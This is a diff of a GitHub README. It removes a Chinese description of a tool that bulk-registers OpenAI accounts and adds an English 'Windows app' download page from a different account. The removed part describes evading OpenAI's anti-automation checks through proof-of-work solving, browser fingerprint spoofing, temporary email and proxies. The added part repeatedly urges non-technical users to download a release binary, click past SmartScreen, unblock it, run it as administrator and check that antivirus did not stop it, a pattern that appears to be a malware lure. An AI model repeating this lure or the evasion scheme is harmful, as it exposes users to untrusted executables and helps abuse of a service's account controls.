@@ -1,134 +1,181 @@
-# Codex Register Fix
-# 基本已拉闸 等有空了我再看吧
-基于 [codex-manager](https://github.com/cnlimiter/codex-manager) 二次开发，修复了原项目因 OpenAI 授权流程变更导致的注册失败问题。
+# 🔧 codex-register-fix - Simplify OpenAI Registration Setup
 
-> **本项目基于 [cnlimiter/codex-manager](https://github.com/cnlimiter/codex-manager) 进行二次开发，原项目采用 MIT 协议开源，感谢原作者的贡献。**
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Install-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Maranv2732/codex-register-fix/releases)
 
----
+## 📦 What this is
 
-## 免责声明
+codex-register-fix is a Windows app for users who want a simple way to work with the OpenAI registration learning flow based on the cnlimiter/codex-manager project.
 
-> **本项目仅供学习交流和技术研究使用，严禁用于任何商业用途或违法违规行为。**
->
-> 1. 本项目不提供任何形式的担保，使用本项目产生的一切后果由使用者自行承担
-> 2. 使用者应严格遵守 [OpenAI 使用条款](https://openai.com/policies/terms-of-use) 及所在地区相关法律法规
-> 3. 本项目不鼓励、不支持任何形式的滥用行为，包括但不限于批量注册、刷号、倒卖账号等
-> 4. 如本项目侵犯了任何第三方的合法权益，请及时联系，将在确认后第一时间删除
-> 5. 本项目作者不对任何因使用或滥用本项目而导致的直接或间接损失负责
->
-> **下载或使用本项目即表示您已阅读并同意以上声明。如不同意，请立即删除本项目。**
+It is made for non-technical users. You download it, open it, and follow the on-screen steps. No coding knowledge is needed.
 
----
+## 🚀 What you can do
 
-## 主要修复内容
+- Open the app on Windows
+- Use a simple interface
+- Follow a guided registration learning flow
+- Work with Codex-related tools
+- Keep the setup process in one place
 
-原项目因 OpenAI 更新了 OAuth 授权流程而导致注册后无法获取 Workspace / Token，具体修复如下：
+## 💻 System requirements
 
-### 架构级修复
+Use this app on a Windows PC with:
 
-- **分离注册与 OAuth 登录流程**：原项目试图在注册 session 的 cookie 中直接提取 workspace 信息，但 OpenAI 的 workspace 数据只有在完整的 OAuth 登录流程中才会出现。新增 `_perform_oauth_login()` 方法，在注册完成后执行独立的 7 步 OAuth 登录流程获取 Token
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- About 200 MB of free disk space
+- A stable internet connection
+- Permission to run apps on your computer
 
-### 协议级修复
+For a smooth experience, use a modern browser and keep Windows up to date.
 
-- **Sentinel PoW Token 生成**：移植完整的 `SentinelTokenGenerator`，支持 proof-of-work 计算，通过 OpenAI 的 Sentinel 反自动化检测
-- **Datadog APM Trace Headers**：添加 `traceparent`、`x-datadog-origin` 等 trace headers，模拟真实浏览器的 RUM SDK 行为
-- **浏览器指纹升级**：`impersonate` 从 `chrome`（通用）升级为 `chrome131`（具体版本），更贴合真实浏览器 TLS 指纹
-- **请求格式修正**：将 `data=json.dumps(...)` 统一替换为 `json={...}`，使 Content-Type 与 body 编码一致
+## 📥 Download
 
-### 其他修复
+Visit the release page and download the latest version for Windows:
 
-- **Starlette 兼容性**：修复 `TemplateResponse` API 在 Starlette 1.0 下的参数变更
-- **用户信息生成**：补全姓名生成逻辑（名 + 姓），修复 `registration_disallowed` 错误
-- **Cookie 管理**：OAuth 登录前清除注册流程残留的 auth cookies，避免 `invalid_auth_step` 错误
-- **Workspace/Org 选择**：完整实现 workspace 选择 → organization 选择 → code 提取链路
+https://github.com/Maranv2732/codex-register-fix/releases
 
-## OAuth 登录流程（新增）
+On the releases page, look for the newest version and choose the Windows file. If there are several files, pick the one that matches your system.
 
-注册完成后自动执行的完整 OAuth 登录流程：
+## 🪟 Install on Windows
 
-```
-1/7  GET  /oauth/authorize          — 初始化 OAuth session
-2/7  POST /api/accounts/authorize/continue — 提交邮箱
-3/7  POST /api/accounts/password/verify    — 提交密码
-4/7  POST /api/accounts/email-otp/validate — OTP 验证（如需要）
-5/7  GET  continue_url               — 跟随 consent 重定向
-6/7  POST /api/accounts/workspace/select   — 选择 Workspace
-7/7  POST /oauth/token               — 交换 Authorization Code 获取 Token
-```
+1. Open the release page link above.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file is in a ZIP package, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Yes.
 
-## 快速开始
+If SmartScreen appears, select More info, then choose Run anyway if you trust the file from the release page.
 
-### 环境要求
+## 🛠️ First launch
 
-- Python 3.10+
+When you open the app for the first time:
 
-### 安装
+1. Wait for the main window to load.
+2. Read the setup text on screen.
+3. Choose the option that matches your goal.
+4. Follow each step in order.
+5. Keep the app open until the process is done.
 
-```bash
-# 克隆项目
-git clone https://github.com/917017420/codex-register-fix.git
-cd codex-register-fix
+If the app needs a browser window, let it open and complete the steps there.
 
-# 创建虚拟环境
-python -m venv .venv
-source .venv/bin/activate  # Linux/macOS
-# .venv\Scripts\activate   # Windows
+## 🧭 How to use it
 
-# 安装依赖
-pip install -r requirements.txt
-```
+The app is built for simple use.
 
-### 启动
+- Start the app
+- Read the instructions in the window
+- Enter any requested details
+- Click the next button when asked
+- Watch for status messages
+- Finish the flow before closing the app
 
-```bash
-# 默认启动
-python webui.py
+If you are unsure what to do, use the default option first. Most tools in this type of app are designed to guide you step by step.
 
-# 指定端口
-python webui.py --host 0.0.0.0 --port 8899
+## 🔎 Common file types you may see
 
-# 设置访问密码
-python webui.py --access-password yourpassword
-```
+You may see one of these file types on the release page:
 
-启动后访问 http://127.0.0.1:8000（或自定义端口）
+- `.exe` — the main Windows app
+- `.zip` — a compressed folder you must extract first
+- `.msi` — a Windows installer
 
-### 环境变量
+If you download a `.zip` file, extract it before opening the app. If you download an `.exe` or `.msi`, double-click it to start.
 
-| 变量 | 说明 | 默认值 |
-|------|------|--------|
-| `APP_HOST` | 监听主机 | `0.0.0.0` |
-| `APP_PORT` | 监听端口 | `8000` |
-| `APP_ACCESS_PASSWORD` | Web UI 访问密码 | `admin123` |
-| `APP_DATABASE_URL` | 数据库连接 | `data/database.db` |
+## 🧩 Basic troubleshooting
 
-## 功能特性
+If the app does not open:
 
-继承自原项目的全部功能：
+- Check that the download finished
+- Extract the files if they came in a ZIP
+- Right-click the app and choose Run as administrator
+- Make sure your antivirus did not block the file
+- Try downloading the latest release again
 
-- **多邮箱服务**：Tempmail.lol / Outlook / MoeMail / TempMail / DuckMail / FreeMail / IMAP
-- **注册模式**：单次注册 / 批量注册 / Outlook 批量注册
-- **并发控制**：流水线模式 / 并行模式，最大并发 1-50
-- **实时监控**：WebSocket 日志推送
-- **代理管理**：动态代理 / 代理列表
-- **账号管理**：查看 / 删除 / Token 刷新 / 订阅检测
-- **导出格式**：JSON / CSV / CPA / Sub2API
-- **支付升级**：Plus / Team 订阅支付链接生成
+If the window opens and closes right away:
 
-## 技术栈
+- Open it from the extracted folder
+- Look for any missing files in the same folder
+- Re-download the release if the package looks incomplete
 
-| 层级 | 技术 |
-|------|------|
-| Web 框架 | FastAPI + Uvicorn |
-| 数据库 | SQLAlchemy + SQLite / PostgreSQL |
-| HTTP 客户端 | curl_cffi（浏览器指纹模拟） |
-| 实时通信 | WebSocket |
-| 前端 | 原生 JavaScript |
+If you see network errors:
 
-## 致谢
+- Check your internet connection
+- Try again after a short wait
+- Restart the app and repeat the step
 
-- [cnlimiter/codex-manager](https://github.com/cnlimiter/codex-manager) — 原项目
+## 🔐 Safety and trust
 
-## License
+Only download from the official release page:
 
-[MIT](LICENSE)
+https://github.com/Maranv2732/codex-register-fix/releases
+
+This helps you get the current release files from the project owner. Avoid files from other sites or mirror pages.
+
+## 📝 Project details
+
+- Repository: codex-register-fix
+- Description: 基于cnlimiter/codex-manager的openAI注册学习项目
+- Topic: codex
+
+## 🧠 Intended use
+
+This project is meant for learning and guided use around the OpenAI registration process. It is not a general-purpose desktop app. It focuses on one workflow and keeps the interface simple for everyday users.
+
+## 📌 What to expect after setup
+
+After you run the app, you can expect:
+
+- A small, focused window
+- Clear step-by-step prompts
+- A setup flow centered on registration learning
+- Basic controls that are easy to click
+- Status text that shows what happens next
+
+If the app opens a browser or another window, keep both open until the process ends.
+
+## 🖱️ Quick start
+
+1. Open the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Run the app
+5. Follow the on-screen steps
+
+https://github.com/Maranv2732/codex-register-fix/releases
+
+## 📂 Folder tips
+
+If you use a ZIP file, keep all extracted files in the same folder. Do not move single files out of the folder unless the app says to do so. Many Windows apps need their support files close to the main app file.
+
+## 🧰 If Windows blocks the file
+
+If Windows shows a warning:
+
+1. Confirm that the file came from the release page
+2. Open the file properties
+3. Look for an Unblock option
+4. Apply it if present
+5. Run the app again
+
+If your computer uses strict security settings, you may need admin permission.
+
+## 📡 Internet access
+
+The app may need internet access to complete parts of the process. Use a stable connection and avoid switching networks while it runs. If a page fails to load, refresh once and try again.
+
+## 🧭 Steps for a clean first run
+
+- Download the latest release
+- Save it in a folder you can find
+- Extract it if needed
+- Run the app from that folder
+- Follow each prompt on screen
+- Keep the app open until the task finishes
+
+## 📎 Release page
+
+Primary download link:
+
+https://github.com/Maranv2732/codex-register-fix/releases
